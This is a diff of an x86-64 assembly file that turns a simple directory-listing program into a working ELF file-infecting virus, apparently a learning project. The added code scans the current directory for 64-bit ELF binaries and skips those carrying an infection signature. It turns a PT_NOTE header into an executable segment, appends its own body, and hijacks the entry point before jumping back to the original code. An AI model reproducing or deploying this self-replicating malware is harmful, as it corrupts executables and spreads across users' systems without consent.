@@ -4,8 +4,6 @@ section .text
   global _start
 
 section .data
-msg db 'Hello, world!',0xa,0x0
-msg_len equ $ - msg
 dot db '.',0x0
 dot_len equ $ - dot
 n db 0xa
@@ -13,151 +11,249 @@ n_len equ $ - n
 
 section .text
 
-strlen: ; rax *str
-  push rbx ; rbx will be used to store initial rax value
-
-  mov rbx, rax ; store rax in rbx
-  .while:
-    cmp [rax], byte 0 ; compare with \0
-    je .end
-
-    inc rax ; increment rax
-    jmp .while ; loop
-
-  .end:
-    sub rax, rbx ; compute difference between rax and rbx
-    pop rbx ; don't forget to set back rbx that we previously pushed
-    ret
-
-ft_write: ; rax *str
-  push rbx
-  push rcx
-  push rdx
-  push rsi
-  push rdi
-
-  mov rcx, rax ; store str in rcx
-  call strlen ; compute its length
-
-  mov rdx, rax ; length
-  mov rsi, rcx
-  mov rdi, 1 ; STDOUT
-  mov rax, 1
-  syscall
-
-  mov rdx, 1 ; length
-  mov rsi, n ;  \n
-  mov rdi, 1 ; STDOUT
-  mov rax, 1 ; write syscall
-  syscall
-
-
-  pop rdi
-  pop rsi
-  pop rdx
-  pop rcx
-  pop rbx
-  ret
-
-
-hello:
-  push rax
-  mov eax, msg
-  call ft_write
-  pop rax
-  ret
-
 _start:
-  push rbp
-  mov rbp, rsp
+  push rdx
+  push rsp
   ; deactivate signals?
+  sub rsp, STACK_SIZE ; 
+  mov r15, rsp ; r15 will be the base of our stack
 
-  sub rsp, 0x2710;0x430 ; char buf[1024]
-  mov rcx, 0 ; O_RDONLY
-  lea rbx, [dot] ; "."
-  mov rax, 5 ; open syscall
-  int 0x80 ; execute syscall
+  ; --- Open "."
+  lea rdi, [dot] ; mov "." into rdi
+  mov rsi, O_RDONLY ; 
+  xor rdx, rdx ;  no flags
+  mov rax, SYS_OPEN ;
+  syscall ; open
 
-  mov [rbp - 0x424], rax ; store result of open into fd
+  cmp rax, 0
+  jl cleanup
 
-
-  mov rdx, 0x100 ; count = 1024
-  lea rsi, [rbp - 0x400] ; load buf
-  mov rdi, [rbp - 0x424] ; load fd
-  mov rax, 217 ; getdents64. 78 for getdents
+  ; --- GetDents64
+  mov rdi, rax ; move fd into rdi
+  lea rsi, [r15 + DIRENT] ; dirent will be in r15 + 400
+  mov rdx, DIRENT_SIZE ; 1024, size of a dirent
+  mov rax, SYS_GETDENTS64 ; 
   syscall
 
-  mov [rbp - 0x424], rax ; store result of getdents64
-  mov rcx, rax
-  xor rax, rax
-  mov [rbp - 0x41c], rax ; num = 0
-  mov rax, [rbp - 0x41c] ; load num in rax
-  cmp rax, [rbp - 0x424] ; while (num < res)
-  jge end
+  mov qword [r15 + DIR_SIZE], rax ; store directory size
 
-  .while:
-    mov rax, [rbp - 0x41c] ; rax = num
-    lea rdx, [rbp - 0x400] ; rdx = (address) buf
+  ; --- Close fd
+  ; rdi already contains fd
+  mov rax, SYS_CLOSE
+  syscall
 
-    add rax, rdx ; p = buf + num
+  ; Check if directory size is < 0
+  cmp qword [r15 + DIR_SIZE], 0
+  jl cleanup
 
-    ; num += p->d_reclen
-    mov rbx, [rbp - 0x41c] ; rbx = num
-    mov cx, [rax + linux_dirent.d_reclen] ; rcx = p->d_reclen
-    add bx, cx ; rbx += rcx
-    mov [rbp - 0x41c], rbx ; store rbx in num
+  xor rcx, rcx ; set rcx to 0
 
-    lea rax, [rax + linux_dirent.d_name]
+  ; --- Loop through files in the directory
+  .loop_directory:
+    push rcx ; store rcx, used later at the end of the while
+    cmp byte[rcx + r15 + DIRENT_D_TYPE], DT_REG ; check if it's a regular file
+    jne .next_file
 
-    .open_file: ; try to open file, and if we succeeded then stat it
-      mov rdi, rax ; d_name
-      mov rax, 2 ; open syscall
-      mov rsi, 2; O_RDWR / Read and Write
+    ; Open file
+    lea rdi, [rcx + r15 + DIRENT_D_NAME] ; load name
+    mov rsi, O_RDWR ; Rea + Write rights
+    xor rdx, rdx ; no flags
+    mov rax, SYS_OPEN
+    syscall
+
+    cmp rax, 0
+    jle .next_file ; if error, go to next file
+    mov r9, rax ; store fd in r9
+
+    ; -- Read Header
+    mov rdi, r9 ; load fd into rdi
+    lea rsi, [r15 + EHDR]; rsi = ehdr
+    mov rdx, EHDR_SIZE ; give it the size we wish to read
+    mov r10, 0 ; offset 0
+    mov rax, SYS_PREAD64 ; scott why pread ?
+    syscall
+
+    ; -- Check header
+    cmp dword [r15 + EHDR], ELF64_MAGIC ; Compare with ELF magic
+    jnz .close_and_next_file ; not an ELF64, go to next one
+
+    ; Check if it's 64 architecture
+    cmp byte [r15 + EHDR_CLASS], ELFCLASS64
+    jne .close_and_next_file
+
+    ; Check if it has already been infected
+    cmp dword [r15 + EHDR_PAD], SCOTT_SIGNATURE
+    jz .close_and_next_file ; file has already been infected
+
+    ; Check for endianness scott
+    ; cmp byte [r15 + ehdr.ei_data], 1 ; little endian
+    ; jne .close_and_next_file
+
+    ; prepare for loop
+    mov r8, [r15 + EHDR_PHOFF] ; load phoffset
+    xor rbx, rbx ; initialize phdr loop counter
+    xor r14, r14 ; initialize phdr file offset
+
+    .loop_phdr:
+      ; -- Read one header
+      mov rdi, r9 ; load fd into rdi
+      lea rsi, [r15 + PHDR_TYPE] ; rsi holds phdr
+      mov dx, word [r15 + EHDR_PHENTSIZE] ; program header entry size
+      mov r10, r8 ; read at ehdr.phoff from r8
+      mov rax, SYS_PREAD64
+      syscall
+
+      cmp byte [r15 + PHDR_TYPE], PT_NOTE ; check if type is PT_NOTE
+      je .infect ; we found, start infecting
+
+      inc rbx ; add one to phdr loop counter
+
+      cmp bx, word [r15 + EHDR_PHNUM] ; have we looped through all ehdr ?
+      jge .close_and_next_file ; couldn't infect because no PT_NOTE found :'(
+
+      add r8w, word [r15 + EHDR_PHENTSIZE] ; increment by ehdr_phentsize
+      jmp .loop_phdr ; loop back
+
+    .infect:
+      ; Get phdr file offset
+      mov ax, bx ; move the loop counter previously in bx to ax
+      mov dx, word [r15 + EHDR_PHENTSIZE] ; mov phentsize to dx
+      imul dx ; multiply dx by ax (phentsize * number_of_ph)
+      mov r14w, ax ; store that in r14
+      add r14, [r15 + EHDR_PHOFF] ; now add phoffset
+
+      ; -- Fstat
+      mov rdi, r9 ; load fd
+      lea rsi, [r15 + STAT] ; stat offset on stack
+      mov rax, SYS_FSTAT
       syscall
 
       cmp rax, 0
-      jl .next_file
-      mov [rbp - 0x430], rax ; store fd 
-      mov rax, rdi
-      call ft_write
-      lea r15, [rbp - 0x2710]
-      .stat:
-        mov rax, 5 ; fstat syscall
-        mov rdi, [rbp - 0x430] ; load fd
-        mov rsi, r15 ; statbuf struct
-        syscall
+      jnz .close_and_next_file ; if fstat failed, go to next file
 
-        cmp rax, 0
-        jl .next_file ; if error continue to next_file
-        ; mov r14, [r15 + 168] ; store target original ehdr.entry 
+      ; -- Append Virus
+      mov rdi, r9 ; load fd
+      mov rsi, 0 ; seek offset 0
+      mov rdx, SEEK_END ; go to the end of the file
+      mov rax, SYS_LSEEK
+      syscall
 
-        ; mmap
-        ; mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0))
-        mov rdi, 0 ; NULL
-        mov rsi, [r15 + stat.st_size]; buf.st_size
-        mov rdx, 3 ; PROT_READ | PROT_WRITE
-        mov r10, 2; MAP_PRIVATE
-        mov r8, [rbp - 0x430] ; fd
-        mov r9, 0;  offset
-        mov rax, 9 ; mmap syscall
-        syscall
+      cmp rax, 0
+      jl .close_and_next_file ; if error go to next file
 
-        cmp rax, 0; if error continue SCOTT modified to stop
-        jl end ; .next_file
+      push rax ; saving target EOF
 
-        ; check headers
-        ; infect
-        ; munmap
-        ; close
+      call .delta ; call will push the address of the next instruction on the stack
+      .delta:
+        pop rbp ; We pop this address into rbp
+        sub rbp, .delta ; by substracting delta we get back, we get the adress of the virus at runtime
+      
+      ; write virus body to the end of the file
+      mov rdi, r9 ; load fd
+      lea rsi, [rbp + _start] ; load _start addres in rsi
+      mov rdx, v_stop - _start; virus size
+      mov r10, rax ; load target EOF into r10
+      mov rax, SYS_PWRITE64
+      syscall
+
+      cmp rax, 0
+      jl .close_and_next_file
+
+      ; -- Patch program header
+      mov dword [r15 + PHDR_TYPE], PT_LOAD ; change PT_NOTE to PT_LOAD
+      mov dword [r15 + PHDR_FLAGS], PF_R | PF_X ; Add read and execute rights to flags
+      pop rax ; restore target EOF into rax
+
+      mov [r15 + PHDR_OFFSET], rax ; put target EOF into phdr_offset
+      mov r13, [r15 + ST_SIZE] ; loading st_size in r13
+      add r13, VADDR ; adding VADDR to target file size. Big address to not interfere with program.
+      mov [r15 + PHDR_VADDR], r13 ; change vaddr to (stat.st_size + VADDR)
+
+      mov qword [r15 + PHDR_ALIGN], ALIGN ; make sure alignment is correct ; SCOTT check
+      add qword [r15 + PHDR_FILESZ], v_stop - _start + JMP_REL_SIZE ; adjust filesize. Add + 5 because of jmp instruction
+      add qword [r15 + PHDR_MEMSZ], v_stop - _start + JMP_REL_SIZE ; adjust memsize. Add + 5 because of jmp instruction.
+
+      ; -- Write the patched header
+      ; pwrite(fd, buf, count, offset)
+      mov rdi, r9 ; load fd 
+      lea rsi, [r15 + PHDR_TYPE] ; load the phdr in rsi, buf
+      mov dx, word [r15 + EHDR_PHENTSIZE] ; count (size of a ph entry)
+      mov r10, r14 ; phdr offset
+      mov rax, SYS_PWRITE64
+      syscall
+
+      cmp rax, 0
+      jle .close_and_next_file
+
+      ; -- Patch ehdr
+      mov r14, [r15 + EHDR_ENTRY] ; store original ehdr entry in r14
+      mov [r15 + EHDR_ENTRY], r13 ; set entry to phdr.vaddr (VADDR)
+      mov r13d, SCOTT_SIGNATURE ; load signature
+      mov dword [r15 + EHDR_PAD], r13d ; add signature
 
 
-    .next_file
-      mov rbx, [rbp - 0x41c] ; 
-      cmp rbx, [rbp - 0x424] ; compare num with result from getdents64
-      jl .while
+      ; Write the patched ehdr
+      mov rdi, r9 ; load fd
+      lea rsi, [r15 + EHDR] ; ehdr offset in stack
+      mov rdx, EHDR_SIZE ; size of ehdr we wish to write
+      mov r10, 0 ; offset is 0
+      mov rax, SYS_PWRITE64
+      syscall
 
-  end:
-    ; reactivate signals?
-    mov ebx, 0 ; exitcode 0
-    mov eax, 1 ; exit syscall
-    int 0x80 ; execute syscall
+      cmp rax, 0
+      jl .close_and_next_file
+
+      ; -- Get to the end of the file
+      mov rdi, r9 ; load fd
+      xor rsi, rsi ; offset 0
+      mov rdx, SEEK_END ; end of the file
+      mov rax, SYS_LSEEK
+      syscall
+
+      cmp rax, 0
+      jl .close_and_next_file ; if error go to next file
+
+      ; Create patched jmp
+      mov rdx, [r15 + PHDR_VADDR] ; load the virtual address
+      add rdx, JMP_REL_SIZE ; add size of jmp rel instruction
+      sub r14, rdx ; scott
+      sub r14, v_stop - _start ; scott
+      mov byte [r15 + JMP_REL], 0xe9 ; jmp instruction
+      mov dword [r15 + JMP_REL + 1], r14d ; scott why
+
+      ; Write patched jmp to EOF
+      mov rdi, r9 ; load fd
+      lea rsi, [r15 + JMP_REL] ; rsi = patched jmp in stack buffer
+      mov rdx, JMP_REL_SIZE ; size of jmp rel
+      mov r10, rax ; load new target EOF
+      mov rax, SYS_PWRITE64
+      syscall
+
+      cmp rax, 0
+      jl .close_and_next_file ; if error continue
+
+      mov rax, SYS_SYNC ; committing filesystem caches to disk
+      syscall
+
+    .close_and_next_file:
+      mov rdi, r9 ; load fd from r9
+      mov rax, SYS_CLOSE
+      syscall
+      jmp .next_file
+
+    .next_file:
+      pop rcx ; restore rcx that we previously stored
+      add cx, word [rcx + r15 + DIRENT_D_RECLEN]
+      cmp rcx, [r15 + DIR_SIZE]
+      jl .loop_directory
+
+cleanup:
+  ; restore signals ?
+  add rsp, STACK_SIZE ; restore rsp
+  pop rsp ; restore rsp
+  pop rdx ; restore rdx
+
+v_stop:
+  xor rdi, rdi ; exit code 0
+  mov rax, SYS_EXIT;
+  syscall
